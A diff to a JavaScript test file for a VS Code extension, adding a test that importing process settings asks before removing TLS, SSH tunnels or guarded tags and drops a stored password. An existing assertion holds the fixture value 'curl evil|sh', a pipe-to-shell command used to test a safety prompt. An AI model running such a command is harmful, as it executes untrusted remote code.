@@ -90,7 +90,7 @@ async function setUp(t, processes) {
   t.after(() => {
     for (const d of context.subscriptions) d.dispose?.();
   });
-  return { live, run: (...args) => stub.commands.get(CONNECT_SCRIPT_COMMANDS.set)(...args) };
+  return { live, context, run: (...args) => stub.commands.get(CONNECT_SCRIPT_COMMANDS.set)(...args) };
 }
 
 test("Set Connect Script asks for code, a file or none, and keeps it on the process", async (t) => {
@@ -166,6 +166,31 @@ test("Import asks before taking a credential command, and drops it on without (#
   stub.picks.push("Import with Them");
   await stub.commands.get("q-lint.importProcesses")(vscode.Uri.file("/l.json"));
   assert.deepStrictEqual(live.processes().map((p) => [p.credentialCommand, p.ssh, p.launch]), [["curl evil|sh", undefined, undefined], [undefined, "jump", { command: "q" }]]);
+});
+
+test("Import asks before taking away TLS, a tunnel or a guarded tag, and forgets a password it reroutes (#1269)", async (t) => {
+  const { live, context } = await setUp(t, [proc("a", { tls: true, ssh: "jump", tags: ["prod"] }), proc("b")]);
+  context.secrets.all.set("q-lint.password.a", "pw");
+  const vscode = require("vscode");
+  const fs = vscode.workspace.fs;
+  vscode.workspace.fs = { readFile: async () => Buffer.from(JSON.stringify([proc("a"), proc("b", { tags: ["x"] })])) };
+  t.after(() => (vscode.workspace.fs = fs));
+  let asked;
+  stub.picks.push(({ message, items }) => ((asked = [message, items.slice(1)]), "Keep Them"));
+  await stub.commands.get("q-lint.importProcesses")(vscode.Uri.file("/l.json"));
+  assert.match(asked[0], /takes from 1 process\(es\) what protects them.*: a \(TLS, SSH tunnel, tag prod\)\. Keep them\?/);
+  assert.deepStrictEqual(asked[1], ["Keep Them", "Import as Written"]);
+  assert.deepStrictEqual(live.processes(), [proc("a", { tls: true, ssh: "jump", tags: ["prod"] }), proc("b", { tags: ["x"] })]);
+  assert.strictEqual(context.secrets.all.get("q-lint.password.a"), "pw");
+  // Escape imports nothing; as written takes them away, and the password
+  // given for TLS through the tunnel is not sent in the clear.
+  stub.picks.push(undefined);
+  await stub.commands.get("q-lint.importProcesses")(vscode.Uri.file("/l.json"));
+  assert.strictEqual(live.processes()[0].tls, true);
+  stub.picks.push("Import as Written");
+  await stub.commands.get("q-lint.importProcesses")(vscode.Uri.file("/l.json"));
+  assert.deepStrictEqual(live.processes()[0], proc("a"));
+  assert.strictEqual(context.secrets.all.has("q-lint.password.a"), false);
 });
 
 test("with q-lint.connection.connectScript.enable off, Set Connect Script refuses and no script is sent", async (t) => {
